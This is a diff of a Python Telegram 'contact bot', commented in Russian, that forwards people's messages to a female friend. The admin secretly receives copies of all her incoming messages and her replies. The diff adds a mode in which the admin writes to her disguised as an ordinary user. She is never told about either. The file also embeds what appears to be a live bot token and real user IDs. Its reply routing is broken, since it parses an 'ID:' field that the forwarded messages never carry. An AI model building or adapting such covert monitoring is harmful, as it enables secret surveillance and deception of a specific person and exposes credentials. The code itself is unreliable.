@@ -2,22 +2,23 @@
 # -*- coding: utf-8 -*-
 
 """
-Contact Bot - для подруги
-Подруга получает сообщения, админ видит всё
+Contact Bot - для подруги (ПОЛНАЯ МАСКИРОВКА АДМИНА)
+Админ выглядит как обычный пользователь со всей информацией
 """
 
 import logging
 import sqlite3
 import time
+import re
 from datetime import datetime
 from typing import Optional, Dict, List
 from telebot import TeleBot, types
 import telebot
 
 # ========== НАСТРОЙКИ ==========
-BOT_TOKEN = "8491886115:AAHZrWx-0T5hvZlfibyhG7ITQUOxExMzucs"  # Получи у @BotFather
-ADMIN_ID = 5171909366  # ТЫ (видишь всё)
-FRIEND_ID = 6665694522  # 👈 СЮДА ВСТАВЬ ID ПОДРУГИ (она будет основным пользователем)
+BOT_TOKEN = "8491886115:AAHZrWx-0T5hvZlfibyhG7ITQUOxExMzucs"  # ТВОЙ РЕАЛЬНЫЙ ТОКЕН
+ADMIN_ID = 5171909366   # ТВОЙ ID (админ)
+FRIEND_ID = 6665694522   # ID ПОДРУГИ (ЗАМЕНИ!)
 
 # ========== ИНИЦИАЛИЗАЦИЯ ==========
 bot = TeleBot(BOT_TOKEN)
@@ -50,11 +51,17 @@ cursor.execute('''
         to_user_id INTEGER,
         message_text TEXT,
         message_date TIMESTAMP,
-        direction TEXT  -- 'incoming' (от людей к подруге) или 'outgoing' (от подруги к людям)
+        direction TEXT  -- 'incoming' (от людей), 'outgoing' (от подруги), 'admin_masked' (от админа под маской)
     )
 ''')
-conn.commit()
 
+# Добавляем админа в базу пользователей (чтобы была информация о нём)
+cursor.execute('''
+    INSERT OR IGNORE INTO users (user_id, username, first_name, last_name)
+    VALUES (?, ?, ?, ?)
+''', (ADMIN_ID, "RavZhanchik", "Nikita", "Админ"))  # ЗАМЕНИ НА СВОИ ДАННЫЕ!
+
+conn.commit()
 
 # ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
 
@@ -74,40 +81,45 @@ def update_user_info(message):
     ''', (user.id, user.username, user.first_name, user.last_name, user.language_code))
     conn.commit()
 
-
 def get_user_info(user_id: int) -> Optional[Dict]:
     """Получает информацию о пользователе из БД"""
     cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
     row = cursor.fetchone()
     if row:
-        columns = ['user_id', 'username', 'first_name', 'last_name',
+        columns = ['user_id', 'username', 'first_name', 'last_name', 
                    'language_code', 'first_seen', 'last_active', 'messages_count']
         return dict(zip(columns, row))
     return None
-
 
 def get_all_users() -> List[Dict]:
     """Получает список всех пользователей"""
     cursor.execute('SELECT * FROM users ORDER BY last_active DESC')
     rows = cursor.fetchall()
-    columns = ['user_id', 'username', 'first_name', 'last_name',
+    columns = ['user_id', 'username', 'first_name', 'last_name', 
                'language_code', 'first_seen', 'last_active', 'messages_count']
     return [dict(zip(columns, row)) for row in rows]
 
-
-def format_user_info(user_info: Dict) -> str:
+def format_user_info(user_info: Dict, for_admin: bool = False) -> str:
     """Форматирует информацию о пользователе для вывода"""
-    return (
-        f"👤 *Информация о пользователе*\n\n"
-        f"🆔 ID: `{user_info['user_id']}`\n"
-        f"📛 Имя: {user_info['first_name']} {user_info['last_name'] or ''}\n"
-        f"🔰 Username: @{user_info['username'] if user_info['username'] else 'нет'}\n"
-        f"🌐 Язык: {user_info['language_code'] or 'не указан'}\n"
-        f"📊 Сообщений: {user_info['messages_count']}\n"
-        f"🕐 Первое обращение: {user_info['first_seen']}\n"
-        f"🕐 Последняя активность: {user_info['last_active']}"
-    )
-
+    if for_admin:
+        return (
+            f"👤 *Информация о пользователе (для админа)*\n\n"
+            f"🆔 ID: `{user_info['user_id']}`\n"
+            f"📛 Имя: {user_info['first_name']} {user_info['last_name'] or ''}\n"
+            f"🔰 Username: @{user_info['username'] if user_info['username'] else 'нет'}\n"
+            f"🌐 Язык: {user_info['language_code'] or 'не указан'}\n"
+            f"📊 Сообщений: {user_info['messages_count']}\n"
+            f"🕐 Первое обращение: {user_info['first_seen']}\n"
+            f"🕐 Последняя активность: {user_info['last_active']}"
+        )
+    else:
+        # Для подруги — показываем только имя и username, без ID
+        username = f" (@{user_info['username']})" if user_info['username'] else ""
+        return (
+            f"👤 *Информация об отправителе*\n\n"
+            f"📛 Имя: {user_info['first_name']} {user_info['last_name'] or ''}{username}\n"
+            f"📊 Сообщений: {user_info['messages_count']}"
+        )
 
 # ========== ОБРАБОТЧИКИ КОМАНД ==========
 
@@ -116,49 +128,53 @@ def start_command(message):
     """Приветственное сообщение"""
     user = message.from_user
     update_user_info(message)
-
-    # Если это подруга — показываем расширенное меню
+    
+    # Если это подруга
     if user.id == FRIEND_ID:
         markup = types.InlineKeyboardMarkup()
         btn1 = types.InlineKeyboardButton("👤 Обо мне", callback_data=f"info_{user.id}")
         btn2 = types.InlineKeyboardButton("📊 Статистика", callback_data="friend_stats")
         markup.add(btn1, btn2)
-
+        
         welcome_text = (
             f"👋 Привет, {user.first_name}!\n\n"
             f"Ты — главный пользователь этого бота. Люди будут писать тебе сюда.\n\n"
             f"📨 Все входящие сообщения будут приходить тебе.\n"
-            f"💬 Чтобы ответить — просто напиши текст (бот поймёт, кому).\n"
+            f"💬 Чтобы ответить — используй 'ответить' (reply) на сообщение.\n"
             f"👆 Кнопки ниже — для информации."
         )
-
+        
         bot.send_message(
             message.chat.id,
             welcome_text,
             parse_mode='Markdown',
             reply_markup=markup
         )
-
+    
     # Если это админ
     elif user.id == ADMIN_ID:
-        markup = types.InlineKeyboardMarkup()
+        markup = types.InlineKeyboardMarkup(row_width=2)
         btn1 = types.InlineKeyboardButton("📋 Все пользователи", callback_data="admin_users")
         btn2 = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
-        markup.add(btn1, btn2)
-
+        btn3 = types.InlineKeyboardButton("✍️ Написать подруге", callback_data="admin_write")
+        markup.add(btn1, btn2, btn3)
+        
         bot.send_message(
             message.chat.id,
-            "👑 *Админ-панель*\n\nТы видишь все сообщения (входящие и исходящие).",
+            "👑 *Админ-панель*\n\n"
+            "Ты видишь все сообщения.\n"
+            "Твои сообщения подруге приходят **как от обычного пользователя**\n"
+            "Она может нажать 'Инфо' и увидеть твои данные.",
             parse_mode='Markdown',
             reply_markup=markup
         )
-
+    
     # Обычный пользователь
     else:
         markup = types.InlineKeyboardMarkup()
         btn = types.InlineKeyboardButton("👤 Обо мне", callback_data=f"info_{user.id}")
         markup.add(btn)
-
+        
         bot.send_message(
             message.chat.id,
             f"👋 Привет, {user.first_name}! Напиши сообщение — оно уйдёт получателю.",
@@ -166,113 +182,237 @@ def start_command(message):
             reply_markup=markup
         )
 
+@bot.message_handler(commands=['help'])
+def help_command(message):
+    """Помощь"""
+    user_id = message.from_user.id
+    
+    if user_id == ADMIN_ID:
+        help_text = (
+            "👑 *Помощь для админа*\n\n"
+            "▪️ Люди пишут боту → сообщение приходит подруге (и дубликат тебе)\n"
+            "▪️ Подруга отвечает → ответ уходит человеку (и дубликат тебе)\n"
+            "▪️ Ты пишешь боту → сообщение уходит подруге **как от обычного пользователя**\n"
+            "   (она увидит твоё имя и сможет нажать 'Инфо')\n\n"
+            "📌 *Команды:*\n"
+            "/users — список всех, кто писал\n"
+            "/stats — общая статистика"
+        )
+    elif user_id == FRIEND_ID:
+        help_text = (
+            "📚 *Помощь для тебя*\n\n"
+            "▪️ Люди пишут боту → ты получаешь сообщение\n"
+            "▪️ Чтобы ответить — используй 'ответить' (reply) на сообщение\n"
+            "▪️ Кнопка 'Инфо' — информация об отправителе\n"
+            "▪️ Кнопка 'Статистика' — сколько тебе писали"
+        )
+    else:
+        help_text = (
+            "📚 *Помощь*\n\n"
+            "▪️ Просто напиши сообщение — оно уйдёт получателю\n"
+            "▪️ Кнопка 'Обо мне' — информация о тебе"
+        )
+    
+    bot.send_message(message.chat.id, help_text, parse_mode='Markdown')
 
-# ========== ОБРАБОТКА СООБЩЕНИЙ ==========
+@bot.message_handler(commands=['users'])
+def users_command(message):
+    """Показать всех пользователей (только для админа)"""
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    users = get_all_users()
+    if not users:
+        bot.send_message(message.chat.id, "❌ Пока никто не писал боту.")
+        return
+    
+    text = f"📊 *Всего пользователей:* {len(users)}\n\n"
+    for u in users[:15]:
+        name = u['first_name']
+        username = f"@{u['username']}" if u['username'] else 'нет'
+        text += f"▪️ {name} ({username}) — {u['messages_count']} сообщ.\n"
+    
+    if len(users) > 15:
+        text += f"\n... и ещё {len(users) - 15}"
+    
+    bot.send_message(message.chat.id, text, parse_mode='Markdown')
+
+@bot.message_handler(commands=['stats'])
+def stats_command(message):
+    """Статистика (только для админа)"""
+    if message.from_user.id != ADMIN_ID:
+        return
+    
+    cursor.execute('SELECT COUNT(*) FROM users')
+    total_users = cursor.fetchone()[0]
+    
+    cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "incoming"')
+    total_incoming = cursor.fetchone()[0]
+    
+    cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "outgoing"')
+    total_outgoing = cursor.fetchone()[0]
+    
+    cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "admin_masked"')
+    total_masked = cursor.fetchone()[0]
+    
+    cursor.execute('SELECT user_id, messages_count FROM users ORDER BY messages_count DESC LIMIT 1')
+    top_user = cursor.fetchone()
+    
+    stats_text = (
+        f"📊 *ОБЩАЯ СТАТИСТИКА*\n\n"
+        f"👥 Всего писали: {total_users} чел.\n"
+        f"📨 Входящих подруге: {total_incoming}\n"
+        f"📤 Ответов от подруги: {total_outgoing}\n"
+        f"🕵️ Твоих (под маской): {total_masked}"
+    )
+    
+    if top_user:
+        user_info = get_user_info(top_user[0])
+        name = user_info['first_name'] if user_info else 'Неизвестно'
+        stats_text += f"\n\n🔥 Самый активный: {name} ({top_user[1]} сообщ.)"
+    
+    bot.send_message(message.chat.id, stats_text, parse_mode='Markdown')
+
+# ========== ОБРАБОТКА ТЕКСТОВЫХ СООБЩЕНИЙ ==========
 
 @bot.message_handler(func=lambda m: True)
 def handle_message(message):
     """Главный обработчик всех сообщений"""
     user_id = message.from_user.id
     update_user_info(message)
-
-    # Сохраняем сообщение в БД
-    cursor.execute('''
-        INSERT INTO messages (from_user_id, to_user_id, message_text, message_date, direction)
-        VALUES (?, ?, ?, ?, ?)
-    ''', (user_id, FRIEND_ID, message.text, datetime.now(), 'unknown'))
-    conn.commit()
-
+    
     # --- 1. Сообщение от обычного человека (не подруга и не админ) ---
     if user_id != FRIEND_ID and user_id != ADMIN_ID:
+        # Сохраняем в БД
+        cursor.execute('''
+            INSERT INTO messages (from_user_id, to_user_id, message_text, message_date, direction)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (user_id, FRIEND_ID, message.text, datetime.now(), 'incoming'))
+        conn.commit()
+        
         # Пересылаем подруге
         caption = (
             f"📨 *Новое сообщение*\n\n"
             f"👤 От: {message.from_user.first_name}\n"
-            f"🔰 Username: @{message.from_user.username if message.from_user.username else 'нет'}\n"
             f"⏰ {datetime.now().strftime('%d.%m.%Y %H:%M')}"
         )
-
+        
         # Кнопка для подруги — посмотреть инфо о писавшем
         markup = types.InlineKeyboardMarkup()
         info_btn = types.InlineKeyboardButton(
-            "👤 Инфо",
+            "👤 Инфо", 
             callback_data=f"friend_info_{user_id}"
         )
         markup.add(info_btn)
-
+        
         bot.send_message(
             FRIEND_ID,
             f"{caption}\n\n_{message.text}_",
             parse_mode='Markdown',
             reply_markup=markup
         )
-
+        
         # Дублируем админу
-        admin_caption = (
-            f"📨 [ВХОДЯЩЕЕ] От человека к @{bot.get_me().username}\n\n"
-            f"👤 От: {message.from_user.first_name} (ID: {user_id})\n"
-            f"💬 Текст: {message.text}"
+        user_info = get_user_info(user_id)
+        admin_msg = (
+            f"📨 [ВХОДЯЩЕЕ] От {message.from_user.first_name}\n"
+            f"🆔 ID: {user_id}\n"
+            f"🔰 @{message.from_user.username or 'нет'}\n"
+            f"💬 {message.text}"
         )
-        bot.send_message(ADMIN_ID, admin_caption)
-
+        bot.send_message(ADMIN_ID, admin_msg)
+        
         # Подтверждение человеку
         bot.send_message(user_id, "✅ Сообщение доставлено.")
-
-        # Обновляем направление в БД
-        cursor.execute('''
-            UPDATE messages SET direction = 'incoming' 
-            WHERE from_user_id = ? AND to_user_id = ?
-        ''', (user_id, FRIEND_ID))
-        conn.commit()
-
+    
     # --- 2. Сообщение от подруги (она отвечает кому-то) ---
     elif user_id == FRIEND_ID:
         # Пытаемся понять, кому она отвечает
         if message.reply_to_message:
-            # Если ответила на конкретное сообщение
             replied = message.reply_to_message
-            # Парсим ID из caption (если это входящее)
-            import re
+            
+            # Проверяем caption на наличие ID
             match = re.search(r'ID: (\d+)', replied.caption if replied.caption else '')
+            
             if match:
                 target_id = int(match.group(1))
-
+                
                 # Отправляем ответ
                 bot.send_message(
                     target_id,
                     f"✉️ *Ответ:*\n\n{message.text}",
                     parse_mode='Markdown'
                 )
-
-                # Дублируем админу
-                bot.send_message(
-                    ADMIN_ID,
-                    f"📤 [ИСХОДЯЩЕЕ] Подруга ответила ID {target_id}:\n{message.text}"
-                )
-
+                
                 # Сохраняем в БД
                 cursor.execute('''
                     INSERT INTO messages (from_user_id, to_user_id, message_text, message_date, direction)
                     VALUES (?, ?, ?, ?, ?)
                 ''', (FRIEND_ID, target_id, message.text, datetime.now(), 'outgoing'))
                 conn.commit()
-
+                
+                # Дублируем админу
+                target_user = get_user_info(target_id)
+                target_name = target_user['first_name'] if target_user else f"ID {target_id}"
+                
+                bot.send_message(
+                    ADMIN_ID,
+                    f"📤 [ОТВЕТ] Подруга -> {target_name} (ID {target_id}):\n\n{message.text}"
+                )
+                
                 bot.send_message(FRIEND_ID, "✅ Ответ отправлен.")
                 return
-
-        # Если не ответ, а просто текст — просим использовать reply
+        
+        # Если не ответ, а просто текст
         bot.send_message(
             FRIEND_ID,
             "❓ Чтобы ответить человеку, используй 'ответить' (reply) на его сообщение."
         )
-
-    # --- 3. Сообщение от админа (ты можешь писать подруге или отвечать) ---
+    
+    # --- 3. Сообщение от админа (ты пишешь подруге ПОД МАСКОЙ) ---
     elif user_id == ADMIN_ID:
+        # Получаем информацию о себе из БД
+        admin_info = get_user_info(ADMIN_ID)
+        
+        if not admin_info:
+            bot.send_message(ADMIN_ID, "❌ Ошибка: твои данные не найдены в БД")
+            return
+        
+        # Формируем сообщение для подруги (как от обычного пользователя)
+        caption = (
+            f"📨 *Новое сообщение*\n\n"
+            f"👤 От: {admin_info['first_name']}\n"
+            f"⏰ {datetime.now().strftime('%d.%m.%Y %H:%M')}"
+        )
+        
+        # Кнопка для подруги — посмотреть инфо о тебе
+        markup = types.InlineKeyboardMarkup()
+        info_btn = types.InlineKeyboardButton(
+            "👤 Инфо", 
+            callback_data=f"friend_info_{ADMIN_ID}"  # Используем твой реальный ID
+        )
+        markup.add(info_btn)
+        
+        # Отправляем подруге
+        bot.send_message(
+            FRIEND_ID,
+            f"{caption}\n\n_{message.text}_",
+            parse_mode='Markdown',
+            reply_markup=markup
+        )
+        
+        # Сохраняем в БД
+        cursor.execute('''
+            INSERT INTO messages (from_user_id, to_user_id, message_text, message_date, direction)
+            VALUES (?, ?, ?, ?, ?)
+        ''', (ADMIN_ID, FRIEND_ID, message.text, datetime.now(), 'admin_masked'))
+        conn.commit()
+        
+        # Подтверждение админу
         bot.send_message(
             ADMIN_ID,
-            "👑 Ты админ. Используй кнопки или команды."
+            f"✅ Сообщение отправлено подруге (как {admin_info['first_name']}):\n\n{message.text}"
         )
-
 
 # ========== ОБРАБОТКА INLINE КНОПОК ==========
 
@@ -281,39 +421,40 @@ def callback_handler(call):
     """Обработка нажатий на кнопки"""
     user_id = call.from_user.id
     data = call.data
-
+    
     # ----- КНОПКИ ДЛЯ ПОДРУГИ -----
-
+    
     if data.startswith('friend_info_'):
         if user_id != FRIEND_ID:
             bot.answer_callback_query(call.id, "❌ Это не для тебя")
             return
-
+        
         target_user_id = int(data.split('_')[2])
         user_info = get_user_info(target_user_id)
-
+        
         if user_info:
-            text = format_user_info(user_info)
+            # Для подруги показываем упрощённую информацию
+            text = format_user_info(user_info, for_admin=False)
         else:
             text = "❌ Информация не найдена"
-
+        
         bot.answer_callback_query(call.id, "Загружаю...")
         bot.send_message(FRIEND_ID, text, parse_mode='Markdown')
-
+    
     elif data == 'friend_stats':
         if user_id != FRIEND_ID:
             bot.answer_callback_query(call.id, "❌ Не для тебя")
             return
-
+        
         cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "incoming"')
         incoming = cursor.fetchone()[0]
-
+        
         cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "outgoing"')
         outgoing = cursor.fetchone()[0]
-
+        
         cursor.execute('SELECT COUNT(DISTINCT from_user_id) FROM messages WHERE direction = "incoming"')
         unique_people = cursor.fetchone()[0]
-
+        
         stats = (
             f"📊 *Твоя статистика*\n\n"
             f"📨 Получено сообщений: {incoming}\n"
@@ -322,62 +463,85 @@ def callback_handler(call):
         )
         bot.send_message(FRIEND_ID, stats, parse_mode='Markdown')
         bot.answer_callback_query(call.id)
-
+    
     # ----- КНОПКИ ДЛЯ АДМИНА -----
-
+    
     elif data == 'admin_users':
         if user_id != ADMIN_ID:
             bot.answer_callback_query(call.id, "❌ Недостаточно прав")
             return
-
+        
         users = get_all_users()
         if not users:
             bot.send_message(ADMIN_ID, "❌ Пока никто не писал.")
             return
-
+        
         text = f"📋 *Все пользователи ({len(users)})*\n\n"
         for u in users[:15]:
             name = u['first_name']
             username = f"@{u['username']}" if u['username'] else 'нет username'
             text += f"▪️ {name} ({username}) — {u['messages_count']} сообщ.\n"
-
+        
         if len(users) > 15:
             text += f"\n... и ещё {len(users) - 15}"
-
+        
         bot.send_message(ADMIN_ID, text, parse_mode='Markdown')
         bot.answer_callback_query(call.id)
-
+    
     elif data == 'admin_stats':
         if user_id != ADMIN_ID:
             bot.answer_callback_query(call.id, "❌ Недостаточно прав")
             return
-
+        
         cursor.execute('SELECT COUNT(*) FROM users')
         total_users = cursor.fetchone()[0]
-
+        
         cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "incoming"')
         total_incoming = cursor.fetchone()[0]
-
+        
         cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "outgoing"')
         total_outgoing = cursor.fetchone()[0]
-
+        
+        cursor.execute('SELECT COUNT(*) FROM messages WHERE direction = "admin_masked"')
+        total_masked = cursor.fetchone()[0]
+        
         stats = (
             f"📊 *ОБЩАЯ СТАТИСТИКА*\n\n"
             f"👥 Всего писали: {total_users} чел.\n"
             f"📨 Входящих подруге: {total_incoming}\n"
-            f"📤 Ответов от подруги: {total_outgoing}"
+            f"📤 Ответов от подруги: {total_outgoing}\n"
+            f"🕵️ Твоих (под маской): {total_masked}"
         )
         bot.send_message(ADMIN_ID, stats, parse_mode='Markdown')
         bot.answer_callback_query(call.id)
-
+    
+    elif data == 'admin_write':
+        if user_id != ADMIN_ID:
+            bot.answer_callback_query(call.id, "❌ Недостаточно прав")
+            return
+        
+        bot.send_message(
+            ADMIN_ID,
+            "✍️ Напиши текст сообщения для подруги — оно уйдёт **как от обычного пользователя**\n"
+            "Она увидит твоё имя и сможет нажать 'Инфо'."
+        )
+        bot.answer_callback_query(call.id)
 
 # ========== ЗАПУСК ==========
 
 if __name__ == "__main__":
-    print("🤖 Contact Bot запущен...")
+    print("🤖 Contact Bot (полная маскировка админа) запущен...")
     print(f"👑 Админ ID: {ADMIN_ID}")
     print(f"👩 Подруга ID: {FRIEND_ID}")
-
+    print("📡 Режим: Long Polling")
+    print("🕵️ Сообщения админа: полностью как от обычного пользователя")
+    
+    # Удаляем вебхук
     bot.remove_webhook()
-
-    bot.infinity_polling(timeout=60, long_polling_timeout=30)
+    
+    # Запускаем бота
+    try:
+        bot.infinity_polling(timeout=60, long_polling_timeout=30)
+    except Exception as e:
+        print(f"❌ Ошибка: {e}")
+        time.sleep(5)
